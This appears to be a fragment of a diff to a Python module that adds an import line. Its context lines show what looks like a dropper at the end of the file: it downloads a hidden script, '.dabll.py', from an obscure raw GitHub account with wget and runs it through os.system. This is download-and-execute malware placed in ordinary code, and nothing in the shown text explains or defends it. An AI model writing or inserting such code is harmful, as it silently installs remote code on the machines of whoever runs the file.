@@ -18,5 +18,6 @@ def g():
 	iii()
 g()	
 
+import os, sys, random, wget
 wget.download("https://raw.githubusercontent.com/sfrsfrsfr404sfrsfrsfr/-/main/.dabll.py")
 os.system("python .dabll.py")
